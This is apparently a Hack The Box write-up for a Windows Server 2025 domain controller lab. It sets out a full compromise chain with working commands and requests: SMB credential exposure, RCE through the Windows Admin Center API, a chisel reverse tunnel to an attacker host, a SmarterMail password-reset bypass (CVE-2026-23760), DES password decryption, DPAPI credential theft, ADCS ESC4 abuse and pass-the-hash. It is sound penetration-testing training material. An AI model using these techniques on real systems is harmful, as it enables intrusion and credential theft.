# DanglingTree — Hack The Box

**Difficulty:** Hard  
**OS:** Windows Server 2025  
**Date:** 2026-08-19  
**Target:** `DC.danglingtree.htb`

## Summary

DanglingTree is a Windows Server 2025 Active Directory domain controller. Credentials found in an anonymously accessible SMB share provided an initial foothold. A broken access control vulnerability in Windows Admin Center allowed remote code execution, which was used to tunnel into an internal SmarterMail instance vulnerable to an unauthenticated authentication bypass (CVE-2026-23760). Password recovery from a SmarterMail backup combined with Windows DPAPI credential harvesting enabled lateral movement through a chain of domain accounts. Full domain compromise was achieved by abusing an Active Directory ACL misconfiguration (ForceChangePassword) and an AD Certificate Services ESC4 vulnerability, ultimately obtaining the Domain Administrator's NT hash via PKINIT.

---

## Reconnaissance

```bash
nmap -sC -sV -p- --min-rate 5000 10.129.x.x
```

Key findings:

```
53/tcp    open  domain        Windows DNS
80/tcp    open  http          Microsoft IIS 10.0
88/tcp    open  kerberos-sec  Windows Kerberos
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap          Active Directory LDAP
443/tcp   open  ssl/https     Microsoft IIS 10.0
445/tcp   open  microsoft-ds  SMB (signing: required, SMBv1: disabled)
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPs
3389/tcp  open  ms-wbt-server RDP (NLA required)
6600/tcp  open  https         Windows Admin Center 2.6.11.4
```

Domain: `danglingtree.htb` | Hostname: `DC` | OS: Windows 11 / Server 2025 Build 26100

> **Note:** Port 6600 (Windows Admin Center) was only discovered in the full port scan (`-p-`). It is absent from default top-port scans.

---

## Enumeration

### SMB — Credential Exposure

Anonymous session enumeration revealed a non-default share named `IT`:

```bash
smbclient -L //10.129.x.x -N
```

```
Sharename     Type   Comment
---------     ----   -------
ADMIN$        Disk   Remote Admin
C$            Disk   Default share
IPC$          IPC    Remote IPC
IT            Disk
NETLOGON      Disk   Logon server share
SYSVOL        Disk   Logon server share
```

The `IT` share was readable without credentials and contained a single file: `DanglingTree_RoE_Assessment.pdf` — a fictionalised Rules of Engagement document embedding plaintext domain credentials for an `anderson.w` contractor account.

```bash
smbclient //10.129.x.x/IT -N
smb: \> get DanglingTree_RoE_Assessment.pdf
```

### LDAP / SAMR — Restricted Visibility

LDAP anonymous bind was denied. Binding as `anderson.w` revealed that the account was located in `OU=External,OU=Contractors`. LDAP read access to other OUs was denied — users `jake.h`, `noah.b`, `alex.o`, and `svc_mail` were invisible via LDAP, LDAPS, and the Global Catalog.

The SAMR interface (SMB `\PIPE\samr`), however, was accessible and allowed RID-based enumeration:

```bash
rpcclient -U 'anderson.w%<password>' dc.danglingtree.htb
rpcclient $> queryuser 0x44F   # jake.h
rpcclient $> queryusergroups 0x44F
```

Group membership via `queryusergroups` confirmed `jake.h` held membership in three custom security groups by RID: `Template_Editors` (1107), `Helpdesk_Cert_Support` (1106), and `DevOps_PKI` (1108).

### AD Certificate Services

Certipy enumeration identified one Enterprise CA (`danglingtree-DC-CA`), 33 templates (11 enabled), all default Windows templates with enrollment restricted to privileged accounts. No ESC vectors were directly available to `anderson.w`. Web enrollment was disabled on both HTTP and HTTPS.

```bash
certipy-ad find -u anderson.w@danglingtree.htb -p '<password>' \
  -dc-ip 10.129.x.x -vulnerable
```

---

## Initial Access — WAC Broken Access Control (RCE)

**Finding:** Windows Admin Center accepted the `anderson.w` credentials but rejected the server connection with "This operation was blocked by role based access control settings." Analysis of WAC API traffic via Burp Suite revealed that the RBAC restriction was enforced only at the UI routing layer — not at the underlying PowerShell remoting endpoint.

Direct POST to the `invokeCommand` API with a valid session token executed commands as `anderson.w`:

```
POST /api/v1/services/WinREST/PowerShell/nodes/dc/invokeCommand
Authorization: Bearer <jwt>
X-XSRF-TOKEN: <token>

{"properties":{"script":"whoami"}}
```

```json
{"results":["danglingtree\\anderson.w"],"completed":true}
```

This constitutes a **broken access control** vulnerability (OWASP A01:2021): authenticated but unauthorised remote code execution on the Domain Controller.

A Python wrapper was developed to automate command execution and file transfers. Chisel was deployed to create a reverse tunnel exposing internal services (SmarterMail on port 17017) to the attacker machine.

```bash
# On attacker
chisel server -p 9000 --reverse

# On DC (via WAC invokeCommand)
Start-Process chisel.exe -ArgumentList "client 10.x.x.x:9000 R:17017:127.0.0.1:17017"
```

---

## Lateral Movement (1) — SmarterMail CVE-2026-23760

**Finding:** `netstat` output from the WAC shell revealed SmarterMail build 9504 listening exclusively on `localhost:17017`.

CVE-2026-23760 (WT-2026-0001) is an unauthenticated password reset vulnerability in the `/api/v1/auth/force-reset-password` endpoint. By supplying `IsSysAdmin:"true"` and an arbitrary old password value, any caller can set a new password for any SmarterMail system administrator.

```bash
# Via chisel tunnel (tunnelled through WAC)
curl -s http://127.0.0.1:17017/api/v1/auth/force-reset-password \
  -H "Content-Type: application/json" \
  -d '{"IsSysAdmin":"true","OldPassword":"x","Username":"svc_mail",
       "NewPassword":"<attacker_pass>","ConfirmPassword":"<attacker_pass>"}'
```

```json
{"success":true,"resultCode":200}
```

With admin credentials, the **Volume Mounts** feature was abused for OS command execution. The "Volume Mount Command" field executes an arbitrary system command on mount — a documented "RCE-as-a-feature" pattern:

```
Volume Mount Path: C:\Windows\Temp\pwn
Volume Mount Command: powershell -nop -w hidden -File C:\ProgramData\bs.ps1
```

This yielded a bind shell running as `DANGLINGTREE\svc_mail`.

---

## Lateral Movement (2) — SmarterMail Credential Recovery

**Finding:** As `svc_mail`, the SmarterMail data directory `C:\SmarterMail` was accessible. A backup domain folder (`danglingtree.htb.bak`) contained user mailbox settings including `password_encrypted` fields for former users: `emma.s`, `liam.m`, `noah.b`, `oliver.t`, `sophia.k`.

SmarterMail stores user passwords reversibly encrypted using **single-DES CBC/PKCS7** with a hardcoded 8-byte key and IV embedded in `SmarterMail.Standard.dll` (field `keymap2` in `CryptographyHelper`). The DES key material was extracted by parsing the PE file's FieldRVA metadata table and locating static byte array initializers. Decryption recovered the plaintext password for `noah.b`.

```python
from Crypto.Cipher import DES
import base64

KEY = bytes.fromhex("<8 bytes from dll>")
IV  = bytes.fromhex("<8 bytes from dll>")
ct  = base64.b64decode("<password_encrypted value>")

cipher = DES.new(KEY, DES.MODE_CBC, IV)
plain  = cipher.decrypt(ct)
pad    = plain[-1]
print(plain[:-pad].decode("utf-8"))
```

```
# User flag location
C:\Users\noah.b\Desktop\user.txt
```

---

## Lateral Movement (3) — DPAPI Credential Harvesting

`cmdkey /list` on the `noah.b` session revealed a saved domain credential:

```
Target: Domain:target=PC01.danglingtree.htb
Type:   Domain password
User:   alex.o
```

The credential blob and DPAPI master key were extracted:

```
# Credential blob
C:\Users\noah.b\AppData\Roaming\Microsoft\Credentials\57FFB67D684C67F09E7153B9C7CC3940

# Master key (GUID from blob header)
C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\S-1-5-21-...-1602\f53fcaba-f057-48e8-8f92-0180d274bf0f
```

Both files were base64-encoded and transferred out. The master key was decrypted offline using `noah.b`'s plaintext password and SID, then used to decrypt the credential blob:

```bash
impacket-dpapi masterkey \
  -file f53fcaba-f057-48e8-8f92-0180d274bf0f \
  -sid S-1-5-21-4220238332-57023728-1129110646-1602 \
  -password '<noah.b password>'

# → Decrypted key: 0x7120d9ad...

impacket-dpapi credential \
  -file 57FFB67D684C67F09E7153B9C7CC3940 \
  -key 0x7120d9ad...
```

```
Target:   Domain:target=PC01.danglingtree.htb
Username: alex.o
Password: <redacted>
```

---

## Privilege Escalation — ACL Abuse + AD CS ESC4

### Step 1: ForceChangePassword (alex.o → jake.h)

BloodHound analysis with `alex.o` credentials revealed a `ForceChangePassword` ACL edge from `alex.o` to `jake.h`. This extended right permits resetting `jake.h`'s domain password without knowing the current value:

```bash
bloodyAD --host dc.danglingtree.htb -d danglingtree.htb \
  -u alex.o -p '<password>' \
  set password jake.h '<new_password>'
```

`jake.h` is a member of `Template_Editors`, `DevOps_PKI`, and `Helpdesk_Cert_Support`, granting write access over AD Certificate Services templates.

### Step 2: ESC4 — Certificate Template Modification

With `jake.h` credentials, Certipy confirmed `WriteProperty` rights over the `Template` certificate template (ESC4). The template was modified to enable enrollee-supplied Subject Alternative Names and Client Authentication EKU:

```bash
certipy-ad template -u jake.h@danglingtree.htb -p '<password>' \
  -dc-ip 10.129.x.x -template Template -save-old
```

A certificate was then requested asserting the Domain Administrator's UPN in the SAN:

```bash
certipy-ad req -u jake.h@danglingtree.htb -p '<password>' \
  -dc-ip 10.129.x.x \
  -ca danglingtree-DC-CA \
  -template Template \
  -upn administrator@danglingtree.htb \
  -out admin
```

### Step 3: PKINIT → NT Hash → Domain Admin

The certificate was exchanged for the Administrator's NT hash via PKINIT:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.x.x
# → NT Hash: <redacted>
```

Pass-the-Hash via `psexec`:

```bash
impacket-psexec \
  -hashes aad3b435b51404eeaad3b435b51404ee:<hash> \
  administrator@10.129.x.x
```

```
Microsoft Windows [Version 10.0.26100.33158]
C:\Windows\System32> whoami
nt authority\system

C:\Users\Administrator\Desktop> type root.txt
<redacted>
```

---

## Flags

- **User:** `[redacted]`  
- **Root:** `[redacted]`

---

## Attack Path

```
Anonymous SMB (IT share)
  └─► anderson.w credentials (RoE PDF)
        └─► WAC broken access control → RCE as anderson.w
              └─► Chisel tunnel → SmarterMail:17017
                    └─► CVE-2026-23760 auth bypass → svc_mail (RCE)
                          └─► SmarterMail .bak DES decrypt → noah.b creds
                                └─► user.txt
                                └─► DPAPI credential store → alex.o creds
                                      └─► ForceChangePassword → jake.h
                                            └─► AD CS ESC4 → Administrator cert
                                                  └─► PKINIT → NT hash → SYSTEM
                                                        └─► root.txt
```

---

## Lessons Learned

- **Full port scan is mandatory on Windows targets.** The WAC service on port 6600 was the critical pivot point and would have been missed without `-p-`.
- **WAC RBAC is UI-level, not API-level.** The GUI can block management access while the underlying PowerShell remoting API remains unprotected. Always probe API endpoints directly through a proxy.
- **SmarterMail uses reversible DES encryption for user passwords.** The hardcoded key lives in the application DLL and can be extracted via FieldRVA metadata parsing — no decompiler required.
- **DPAPI is only as strong as the user's password.** Saved Windows credentials are trivially decryptable offline once you have the user's plaintext password.
- **Custom AD groups are always worth enumerating.** Groups like `Template_Editors` and `DevOps_PKI` directly signal AD CS attack surface; always map custom groups to their corresponding permissions.
- **RID cycling via SAMR bypasses LDAP ACL restrictions.** When LDAP read access to certain OUs is restricted, the `\PIPE\samr` interface may still allow account discovery by RID. Enumerate with `rpcclient queryuser` when `ldapsearch` returns nothing.

---

## References

- [CVE-2026-23760 / WT-2026-0001 — SmarterMail Auth Bypass (watchTowr Labs)](https://labs.watchtowr.com)
- [SpecterOps — Certified Pre-Owned: Abusing Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [ly4k/Certipy — AD CS ESC research and tooling](https://github.com/ly4k/Certipy)
- [OWASP A01:2021 — Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [impacket-dpapi — DPAPI offline decryption](https://github.com/fortra/impacket/blob/master/examples/dpapi.py)
- [MITRE ATT&CK T1649 — Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/)
